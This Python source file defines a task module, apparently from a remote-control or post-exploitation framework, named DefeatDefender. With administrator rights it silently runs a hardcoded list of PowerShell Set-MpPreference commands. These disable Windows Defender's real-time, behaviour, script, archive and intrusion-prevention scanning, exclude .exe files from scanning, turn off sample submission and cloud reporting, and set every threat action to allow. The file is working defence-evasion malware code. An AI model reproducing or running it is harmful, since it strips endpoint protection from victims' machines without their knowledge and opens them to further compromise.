from tasks.__task import Task

import shlex
import subprocess

COMMANDS = ['powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""',
            'powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"',
            'powershell.exe -command "Set-MpPreference -PUAProtection disable"',
            'powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
            'powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"',
            'powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"',
            'powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"',
            'powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"',
            'powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"',
            'powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"',
            'powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"',
            'powershell.exe -command "Set-MpPreference -MAPSReporting 0"',
            'powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"',
            'powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"',
            'powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"',
            'powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"',
            'powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"']


class DefeatDefender(Task):
    """Disables Windows Defender"""
    platforms = ["win32"]
    description = __doc__
    administrator = {"win32": True}

    def __init__(self, task_id):
        super(DefeatDefender, self).__init__(task_id)

    def run(self, **kwargs):
        s = 0
        for c in COMMANDS:
            p = subprocess.run(shlex.split(c), creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
            if p.returncode == 0:
                s += 1
        if s == len(COMMANDS):
            return "All commands succeed: {}/{}".format(s, len(COMMANDS))
        else:
            raise Exception("Some commands failed: {}/{}".format(s, len(COMMANDS)))
